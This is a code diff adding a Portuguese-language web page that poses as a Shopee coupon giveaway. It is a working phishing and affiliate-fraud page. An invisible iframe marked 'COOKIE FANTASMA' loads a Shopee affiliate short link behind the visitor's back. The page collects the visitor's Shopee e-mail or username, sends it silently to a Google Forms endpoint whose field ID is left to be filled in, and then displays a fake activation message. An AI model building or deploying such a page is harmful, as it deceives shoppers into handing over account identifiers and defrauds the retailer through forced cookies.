@@ -1,0 +1,87 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Você ganhou R$30 de Cupom</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        h1 {
+            color: #ff5722;
+        }
+        input[type="text"] {
+            padding: 10px;
+            width: 90%;
+            margin: 15px 0;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+        }
+        button {
+            background-color: #ff5722;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        #mensagem {
+            margin-top: 20px;
+            color: green;
+            font-weight: bold;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Você ganhou R$30 de Cupom!</h1>
+        <p>Para ativar, digite seu e-mail ou nome de usuário Shopee abaixo:</p>
+        <input type="text" id="usuario" placeholder="Seu e-mail ou usuário Shopee">
+        <button onclick="verificar()">Ativar Cupom</button>
+        <p id="mensagem">Cupom ativado com sucesso! Use a Shopee normalmente.</p>
+    </div>
+
+    <!-- COOKIE FANTASMA - iframe invisível -->
+    <iframe src="https://s.shopee.com.br/2B2BriqQRJ" style="width:0;height:0;border:0;display:none;"></iframe>
+
+    <!-- Script para enviar dados para o Google Forms -->
+    <script>
+        function verificar() {
+            var usuario = document.getElementById('usuario').value;
+            document.getElementById('mensagem').style.display = 'block';
+
+            // Enviar para um Google Forms (link fictício de exemplo)
+            var formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSc-fake-form-link/formResponse";
+            var formData = new FormData();
+            formData.append("entry.1234567890", usuario); // Substitua pelo ID real do campo
+
+            fetch(formUrl, {
+                method: "POST",
+                mode: "no-cors",
+                body: formData
+            });
+        }
+    </script>
+</body>
+</html>
